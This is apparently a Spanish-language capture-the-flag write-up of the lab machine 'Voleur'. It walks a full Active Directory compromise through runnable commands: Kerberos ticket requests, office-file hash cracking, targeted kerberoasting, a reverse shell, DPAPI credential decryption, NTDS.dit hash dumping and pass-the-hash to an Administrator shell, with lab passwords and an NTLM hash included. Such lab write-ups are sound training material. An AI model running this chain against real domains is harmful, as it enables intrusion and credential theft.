OS: Windows 
Nivel: Medium
IP: 10.10.11.76

Username: ryan.naylor
Password: HollowOct31Nyt
# Escaneo 
### Busqueda de puertos abiertos

```shell
sudo nmap 10.10.11.76 -p- -sS --min-rate 5000 -n -Pn  -oG ports
```

![[Pasted image 20251018181845.png]]
### Escaneo de cada puerto

```python
sudo nmap -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,55666,55667,55679,55684,55697 -sCV -T5 -vvv -oN exact 10.10.11.76
```


```ruby
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-19 07:17:57Z)

135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR

3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped    syn-ack ttl 127

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found

|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55666/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
55667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel  

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 8814/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 48368/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m01s
| smb2-time: 
|   date: 2025-10-19T07:18:49
|_  start_date: N/A

Read data files from: /usr/share/nmap

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Oct 18 18:19:30 2025 -- 1 IP address (1 host up) scanned in 102.74 seconds
```

debemos definir los nombres de dominio y el nombre del DC, para esto podemos usar netexec usando un escaneo por ldap:

```shell
sudo netexec ldap -u 'ryan.naylor' -p 'HollowOct31Nyt'
```

![[Pasted image 20251019060920.png]]

En este caso el equipo se llama DC, y el dominio es voleur.htb, lo que seria dc.voleur.htb:

por lo que debemos agregar `10.10.11.76    dc.voleur.htb` al /etc/hosts

Como podemos ver nos sale un error: STATUS_NOT_SUPPORTED, esto puede significar que no está habilitado NTLM, por ende es necesario utilizar el protocolo kerberos, para esto primero debemos obtener un TGT, mas info en [[4- Obtener un TGT para el usuario actual]]:


!!! NO SABIA !!! NUEVO
```python
getTGT.py '{DOMINIO}'/'{USUARIO}':'{PASSWORD}'
```

Esto va a guardar el ticket en un archivo llamado `{USUARIO}.ccache`, tenemos que guardar la ruta a este archivo en una variable de entorno llamada `KRB5CCNAME`:

```shell
sudo export KRB5CCNAME=/home/juan/ryan.naylor.ccache
```

Ya podemos usar la opcion `-k` en las diferentes herramientas relacionadas a AD (Active Directory), empecemos volviendo a intentar la autenticacion de antes :

```shell
sudo netexec ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```

![[Pasted image 20251019083410.png]]

Como podemos ver, ahora si se hizo la autenticacion de forma exitosa (Se ve por el '+' y el color verde), por lo que podemos pasar al siguiente paso, buscar por recursos en la maquina:

```shell
smbclient.py 'voleur.htb/ryan.naylor:HollowOct31Nyt@dc.voleur.htb'  -k
```

De esta forma obtendremos una shell para interactuar con los diferentes recursos de smb, empecemos viendo los recursos compartidos disponibles:

```shell
#> Shares
```

Vemos unos cuantos pero solo uno lo podemos leer y tiene q interesante (Recordemos que los siguientes recursos son predeterminados y no nos interesan: IPC\$, ADMIN\$, C$, SYSVOL, NETLOGON):

![[Pasted image 20251019132217.png]]

Entonces entramos a IT usando `use IT`:

y mirando el recurso encontramos un archivo xlsx (excel) protegido por una contraseña vamos a intentar extraer el hash para posteriormente crackear:

Para esto vamos a usar la herramienta office2hash.py, esta herramienta no solo sirve con excel, sirve para cualquier herramienta de office, puedes encontrar esta herramienta [aquí](https://gist.githubusercontent.com/luca-m/42e9a556a8b621bb181456067785358c/raw/19e358cbd44b8e60e83add7db9015e8c628dcc4c/office2john.py):

```ruby
python3 office2hash.py Access_Review.xlsx
```

Ahora esto nos da un hash el cual podemos crackear usando john:

```ruby
sudo john hash /home/juan/wordlists/rockyou.txt
```

![[Pasted image 20251020085415.png]]

Entramos al archivo y vemos algunas cosas interesantes:

![[Pasted image 20251020085634.png]]
Vemos un usuario Todd.Wolfe, y su contraseña pero a su vez nos dice que esta cuenta fue deshabilitada, intenté usar esa contraseña con todos los usuarios y perdí mucho tiempo en ello (ERROR!!!!)

Vemos que abajo en las service accounts, cada una tiene una string, podemos intentar usarlas como contraseñas: 

```ruby
getTGT.py 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
```

Las credenciales al ser validas nos da un ticket TGT que podemos usar para autenticarnos.

Ahora podemos intentar hacer una enumeracion con bloodhound-python:

```ruby
bloohound-python -u 'svc_ldap' -k -d voleur.htb -ns 10.10.11.76 -no-pass -c all 
```

En bloodhound podemos ver que nuestro usuario svc_ldap tiene permisos write SPN, es importante matizar, que por defecto **NO HAY NINGUN SPN**, por lo que no podemos hacer un kerberoasting, intenté hacer un kerberoasting  con GetUserSPNs.py, y no me salio nada, asumí que no habia kerberoasting (ERROR!!!) cuando debí tener en cuenta el writeSPN , pero cuando tenemos permisos writeSPN significa que podemos asignarle un SPN a un usuario, y ahí si realizar el kerberoasting:

![[Pasted image 20251021094622.png]]
Como podemos ver, primero se crea un SPN para cada usuario, se hace un Kerberoasting, y posteriormente se elimina ese SPN, es importante usar la opcion --dc-host como lo hice en la imagen, ya que anteripormente intenté solo poner el -d 'voleur' y --dc-ip (!!ERROR), pero esto no funcionaba ya que el NTLM no estaba habilitado (solo se permiten autenticaciones usando kerberos)

Ahora vamos a Crackear ambos hashes (Tanto de WinRM como de lacey.miller)

![[Pasted image 20251021110821.png]]

Solo nos dio la password de WinRM, este usuario nos eprmite conectarnos por WinRM ya que hace parte de los REMOTE MANAGMENT USERS:

![[Pasted image 20251021124255.png]]

!!!IMPORTANTE!!!! 

Es posible que te salga un error como este:

![[Pasted image 20251021124359.png]]

En este caso visitar [[Autenticación#Cannot find KDC for REALM "{domain}.example"]]

No vemos nada interesante en este usuario svc_winrm, en bloodhound, si le echamos un ojo a svc_ldap, vemos que está en el grupo RESTORE USERS, lo que nos puede dar una idea de que los pertenecientes a este grupo, pueden restaurar objetos eliminados, recordemos que tenemos al contraseña de un usuario eliminado llamado Todd

![[Pasted image 20251023123212.png]]

y tambien nos dice que tiene acceso a Second-Line  Support, el problema es que para restaurar objetos, necesitamos acceso remoto a el dominio, pero svc_ldap no tiene permisos winrm, entonces, Que podemos usar? RunasCS!! con esto podemos hacer una reverse shell que es ejecutada por svc_ldap, por ende, tenemos acceso remoto como ese usuario:

![[Pasted image 20251023224701.png]]

Reverse Shell:
![[Pasted image 20251023224745.png]]

Ahora podemos intentar restaurar al usuario Todd.wolfe, y como el Esxcel que habiamos encontrado, sabemos que este usuario tiene acceso a Second-Line Support, para restaurar objetos usar [[Restaurar un usuario eliminado]]:

```shell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects | Restore-ADObject 
```

Ahora podemos ver los recursos dentro de IT, vemos que ahora hay una carpeta diferente llamada Second-Line Support

![[Pasted image 20251024114147.png]]

Vemos que tenemos un backup que se hizo de los archivos de Todd.Wolfe, por lo que podemos buscar blobs y masterkeys que nos puedan dar algunas credenciales que nos sean utiles [[DPAPI & BLOBS]]: 

- La masterkey la podemos obtener en:

`C:/Users/Todd.Wolfe/AppData/Roaming/Microsoft/Protect/{SID}/{MasterKey}`

- El blob lo podemos encontrar en:

`C:/Users/Todd.Wolfe/AppData/Roaming/Microsoft/Credentials/{BLOB}`


Primero tenemos que desencriptar la masterkey:

##### Desencriptando  MasterKey usando credenciales

```ruby
impacket-dpapi masterkey -file {MASTERKEY_FILE} -password '{Password}' -sid {SID-TODD} 
```

##### Desencriptando BLOB con masterkey

```ruby
impacket-dpapi credential -file {BLOB ARCHIVO} -key { MasterKey (OBTENIDA ANTERIORMENTE)}   
```

![[Pasted image 20251024200827.png]]

### Vamos a ver a que recursos tenemos acceso

![[Pasted image 20251024201725.png]]

Ya descargados este par de archivos los podemos revisar, ya con el nombre de id_rsa nos podemos hacer una idea de que esto puede ser una llave privada de ssh:

![[Pasted image 20251025114151.png]]

Recordemos que en la hoja de excel que obtuvimos nos decian que consultaramos con jeremy para el acceso a svc_backups, por lo que podemos intuir que esta clave privada es para conectarnos a svc_backups:

![[Pasted image 20251025120235.png]]

La nota nos hace saber que  cuando accedemos por ssh, en realidad estamos accediendo un WSL, lo cual es una especie de entorno de linux dentro de windows, y como la nota tambien nos hacia saber, seguramente se esté usando este WSL para hacer backups del sistema, por lo que siguiente ese orden de ideas, la maquina linux tiene que tener algún acceso a los recursos en windows, si buscamos en internet "WSL acces to windows files"  encontraremos la siguiente pagina:
 
![[Pasted image 20251025160523.png]]

Vemos que en `/mnt/c` vamos a encontrar todos los archivos en windows, entonces vamos a esa ruta:

![[Pasted image 20251025160631.png]]

Vemos varios archivos y carpetas, entre las carpetas encontramos IT, el recurso compartido, vamos a ver si encontramos algo de interés:

![[Pasted image 20251025163246.png]]

Vemos una carpeta llamada  Backups:

![[Pasted image 20251025165725.png]]

teniendo acceso a estos dos archivos, podemos extraer las credenciales usando impacket-secretsdump:

```python
secretsdump.py -ntds ./ntds.dit -system ./SYSTEM LOCAL
```


Esto nos va a devolver el hash NTLM del suuario administrador, usando ese hash, podemos solicitar un TGT, el cual nos permite autenticarnos con winrm contra el DC:

```python
impacket-getTGT 'VOLEUR.HTB/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2  
  
export KRB5CCNAME=Administrator.ccache  
klist  
  
# authenticate to WinRM via Kerberos to get an Administrator shell  
evil-winrm -i dc.voleur.htb -r voleur.htb -k -u Administrator
```


Y de esta forma obtenemos acceos a la maquina.